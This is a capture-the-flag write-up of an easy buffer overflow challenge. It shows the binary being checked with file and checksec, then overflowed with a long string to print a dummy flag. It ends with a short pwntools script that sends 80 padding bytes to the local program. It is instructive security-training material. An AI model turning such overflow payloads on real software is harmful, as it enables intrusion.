---
title: "pwn - Buffer overflow"
date: 2023-05-20 15
time: 15:40:00 +0300
image: /assets/img/Posts/overflow.PNG
categories: [InterUniCTF, KCA, Easy]
tags: [pwn, reversing, overflow, binary, ghidra, pwntools, msf_modules]
---

> In this writeup, i will demostrate how to use basic tools to reverse a binary, determine the offset of the buffer using msf modules and automate the exploitation using pwntools.
{: .prompt-tip }

## Lets get started

Download the binary to our local machine. You can get the a copy of the binary from [here](/assets/img/Posts/buffer-overflow/chall). First thing i do after i get a binary in my machine is checking the file description by running `file <binary>`. We see that it is a  64-bit architecture, dynamically linked and it is not stripped which means we can get to see the source code when we use `ghidra`. In this challenge we will not need it.

```bash
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ file chall 
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a485af73b0e8f94c6fa49af674e6aaaad3af1180, for GNU/Linux 3.2.0, not stripped
```

With that information we can move on and check the security set in the file using `checksec --file <binary>`

```bash
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ checksec --file chall 
[*] '/home/kali/hacks/kca/pwn/overflow/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

We see that there is no `stack canary` which means stack values have no security that could protect them from buffer overflow. NX - non-executable or non execute is enabled which means that we cannot execute our injected data in the memory. and finally `PIE (Position Independent Executable)` is enabled too. So this program will not be using a static virtual address hence it will be changing every time we run it. Read more on binary files security [here](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)

## Fun part

make it executable `chmod +x <binary>`

```bash
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ chmod +x chall
```
Going on and executing it asks us to overflow the buffer. simple, right? trying  sending some several A's we get no result. Adding some more we get an error `Error opening file, talk to admin!`. Sweeeeeet
Which file is it trying to open? because it is a CTF it must be a flag file.

```bash
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ ./chall                 
Overflow to get the flag: aaaaaaaaaaa
                                                                                                                                                                       
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ ./chall
Overflow to get the flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Error opening file, talk to admin!                                                                                                                                                                       
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ 
```
Created a dummy in `flag.txt` file in the same directory. Ran it again with buffer and booooooooom we get the flag.

```bash
┌──(kali㉿kali)-[~/hacks/kca/pwn/overflow]
└─$ ./chall      
Overflow to get the flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag{1t_mU5t_b3_y0U}
```

### Conclusion
> The challenge never required any advanced knowlegde of binary exploitation or buffer overflow stuffs. It was just sending enough buffer to overflow it and just like that it gave you the flag.

## Bonus section
Well, let me write a python script using pwntools to automate the above explotation. It is not necessary but one can get a basic understanding of how to use pwntools. 

```python
from pwn import *

p = process("./chall")


#send any size of buffer. i mean it should be large enough
payload = b''
payload += b'\x90'*80

p.recvuntil("flag: ")
p.sendline(payload)
print(p.recv())

```